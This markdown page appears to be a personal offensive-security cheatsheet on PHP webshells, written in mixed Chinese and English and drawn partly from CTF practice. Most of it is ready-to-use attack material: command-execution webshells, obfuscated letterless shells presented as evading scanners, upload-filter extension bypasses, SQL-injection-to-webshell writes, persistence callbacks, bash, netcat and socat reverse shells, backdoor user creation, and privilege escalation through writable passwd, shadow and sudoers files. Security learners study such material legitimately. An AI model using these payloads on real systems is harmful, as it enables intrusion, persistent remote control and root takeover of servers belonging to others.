# Webshell
*  [Webshell cheatsheet](#webshell-cheatsheet)  
*  [Bypass blacklist extension](#bypass-blacklist-extension)  
*  [SQL inj to webshell](#sql-inj-to-webshell)  
*  [Don't delete my webshell](#dont-delete-my-webshell)  
*  [Reverse shell](#reverse-shell)  
*  [Privilege escalation](#privilege-escalation)  
*  [Reference](#reference)

# Webshell cheatsheet
```php
// 回顯
<?php system('ls'); ?>
<?php system(ls); ?>
<?php system($_GET['cmd']); ?>
<?php system($_GET[1]); ?>

<?php passthru('ls'); ?>


// 不回顯
<?php shell_exec('echo 1>1'); ?>        // 1=echo 1>1
<?php shell_exec('>1');    ?>        // 1=>1

<?php shell_exec('wget -O 1.php url');   ?> // download shell
<?php shell_exec('curl -o 1.php url');  ?>  // 預設下載index.html

<?=`$_GET[1]`;          ?>         // <?= is used to shorten the <?php echo `blah`;
// ``就像exec不會直接顯示結果，需要echo
echo `$_GET[1]`;&1=ls

echo "{${phpinfo()}}";
echo "{${system("ls")}}";
die("...");


// 文件包含漏洞
include$_GET[1];             // 中間空格可以省略
include /var/lib/php/sessions/sess_xxxxx  // session內容可控的情況

// 思路：寫入base64編碼過的shell檔，再進行解碼  <環境www>
$_GET[1](file,chracter,8);&1=file_put_contents .....
include$_GET[0];&0=php://filter/read=convert.base64-decode/resource=file


// PHP代碼執行
<?php eval('echo `ls`;');    ?>   // eval裡的PHP代碼必須加;
<?php assert('phpinfo();');   ?> // assert裡的PHP代碼可以不加;

<?php preg_replace("/\[(.*)]/e",'\\1',$_GET['str']);  ?> // ？str=[phpinfo()]
// 必須有匹配才會執行
// PHP 5.5起，會產生 E_DEPRECATED 錯誤
// PHP 7.0.0後，必須使用 preg_replace_callback() 代替


// 思路：延伸數組＋回調函數 php 5.4以後的特性
// 回調後門 多可以避免木馬查殺  
// 參考下方reference
?1[]=blah&1[]=system();&2=assert     
param=usort(...$_GET);
```
長度限制思路：  
* 用檔名拼湊成命令,再一次ls進一個shell script [detail](https://shinmao.github.io/2018/02/20/A-tiny-shell/)

[system v.s. exec v.s. shell_exec](https://blog.longwin.com.tw/2013/06/php-system-exec-shell_exec-diff-2013/)  
**exec()和shell_exec()我們都會搭個echo**  
[這是一篇很屌的php lib exp分析](https://stackoverflow.com/questions/3115559/exploitable-php-functions)  

```php
// 最簡單的是用.串接字元
$😭 = $😙. $😀. $🤗. $🤗. $🤩. $😆. $🙂. $🤔;

// XOR
$😊 = "||||%-" ^ "/%/(``";
$😊 ("`|" ^ ",/");
```
在VXCTF2018中，使用了這個無字母，無數字，無底線的shell，內容為`<?=SYSTEM(LS);`。  
```php
<?=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]); // $_GET[_]($_GET[__]);
```  
在`Meepwn Quals 2018`中，使用了這個無文字shell，如果礙於底線，也可以換成表情符號...
[VXCTF2018](https://github.com/shinmao/CTF-writeups/tree/master/vxcon2018)

# Bypass blacklist extension  
[服务器针对文件的解析漏洞汇总](https://mp.weixin.qq.com/s/f0y_AjRtc4NjEqeJe6cPhw)  
In addition to `.php`，with regex in conf:  
* `.php3`  
* `.php4`  
* `.php5`  
* `.php7`  
* `.pht`  
* `.phtml`  
can also be parsed as php file  
* `.php.xxx`  
In old version  
apache2 parse from the right side to left side, until it recognize the extension  
* `.php/.`
What's worth mention: this trick cannot be used to overwrite old file  
php would recursively remove the part of `/.`.  
[Apache2 php5 conf](https://github.com/shinmao/Web-Security-Learning/blob/master/Webshell/apache2_php5.conf)  
* `move_uploaded_file()`  
With use of lstat() in this function, we can bypass the above overwrite limitation on `/.`  
[My own notes](https://shinmao.github.io/web/2018/04/13/The-Magic-from-0CTF-ezDoor/)

# SQL inj to webshell
MYSQL:  
```
select into outfile(dumpfile)  // mysql write to document
```  
E.G.  
```  
union select 1,2,"<? system($_GET['fuck']) ?>" into outfile "://path"
```

# Dont delete my webshell
```php
<?php
$e = $_REQUEST['e'];
register_shutdown_function($e, $_REQUEST['pass']);
// callback after shutdown
// ?e=assert&pass=phpinfo();

<?php
$e = $_REQUEST['e'];
declare(ticks=1);
register_tick_function ($e, $_REQUEST['pass']);
?>
```  
[@lem0n Bypass_Disable_functions_Shell](https://github.com/l3m0n/Bypass_Disable_functions_Shell)  

# Reverse shell
If the target is located in the intranet, I cannot connect to it from the outside then Reverse shell is your best choice. Reverse shell means the victim activate the connection to the attacker.  
1. bash  
```php
bash -i >& /dev/tcp/target_ip/8080 0>&1
```  
`>&` means previous one combines with the following one then redirect to it. Therefore, `0>&1` means `std_input` combines with `std_output` and redirect to `std_output`.  
2. netcat  
```php
nc -lvvp 8080   // listen to the 8080 port
nc target_ip 8080 -t -e /bin/bash
```
build up a connection then execute `/bin/bash`  
3. socat  
```php
socat tcp-listen:8080 -
./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:target_ip:8080
```  
4. python, php, java, perl  
http://www.03sec.com/3140.shtml  
5. msfvenom can generate the payload  
```php
msfvenom -l payloads cmd/unix/reverse
// this can list all the reverse script
msfvenom -p cmd/unix/xxxx lhost=target_ip lport=target_port R
```  

If you don't like reverse shell anymore, you can...  
1. add user  
```php
useradd new;echo 'new:password'|chpasswd
useradd new;echo -e 'xxxxxxx' |passwd test
```  
2. Get std shell with python  
```php
python -c "import pty;pty.spawn('/bin/bash')"
```  

reference from [安全客](https://www.anquanke.com/post/id/87017)  

# Privilege escalation    
1. escalate with kernel exploit  
```php
uname -a // you can get the version of kernel and information
e.g. Linux shinmao 4.17.0-kali1-amd64 #1 SMP Debian 4.17.8-1kali1 (2018-07-24) x86_64 GNU/Linux
```  
search exploit in kali  
```php
searchsploit linux priv esc 4.17.0 kali
```  
We still need to compile it to run it on the victim machine!! However, in the real world we might run into the condition such that `gcc` isn't installed on the server. In addition, **reading source code** before you compile it is the most important thing!  

2. `/etc/shadow` of Plain text  
`/etc/passwd` stores the system user, `/etc/shadow` stores the hash of password  
```php
root:x:0:0:root:/root:/bin/bash // first column means user name, second column x means hash is in shadow

root:$6$oTOxM5L9$.riBRt1HVnB5VDzDY/6FJLpMdN7pJRYDBeJGxRM1dklS/fY4if54eOK8GyFiyjS2bhuvA.CXNpGnlLs6RRXi1.:17760:0:99999:7:::
```  
However, in the real world we would run into the issue such as permission. If `/etc/passwd` is writeable, we can overwrite the `x` with the hash we already know. Or if `/etc/shadow` is readable, we can give the hash to john or hashcat.  

3. `/etc/sudoers` is writeable  
The document can define who is able to run `sudo`.  
```php
# User privilege specification
root	ALL=(ALL:ALL) ALL
1pwnch ALL=(ALL:ALL) ALL  
```  
Now you can use `sudo /bin/bash` to escalate your privilege.  

4. [利用crontab提權](https://www.anquanke.com/post/id/148564#h2-2)  
```php
ls -l /etc/cron*
```  

5. [通过可写文件获取Root权限的多种方式](http://www.freebuf.com/articles/system/175086.html)  
   Run the root's script which has SUID can also help escalate to root...  

Therefore, we need to find the vulnerability efficiently. You can find some script to brute check, or you can check manually here [basic linux privilege escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation).  

### Reference  
* [千变万化的WebShell-Seebug](https://paper.seebug.org/36/)
* [七字短shell](http://wonderkun.cc/index.html/?p=524%EF%BC%88%E9%80%9A%E8%BF%87)  
* [PHP MANUAL Assert](http://php.net/manual/en/function.assert.php)  
* [PHP MANUAL Usort](http://php.net/manual/en/function.usort.php)  
* [PHP MANUAL 延長數組](http://php.net/manual/zh/migration56.new-features.php)
* [P師傅木馬免殺](https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html)  
* [stackoverflow Exploitable PHP functions](https://stackoverflow.com/questions/3115559/exploitable-php-functions)
* [Ali0thNotes PHP代码审计归纳](https://github.com/Martin2877/Ali0thNotes/blob/master/Code%20Audit/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%BD%92%E7%BA%B3.md)  
* [Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation)
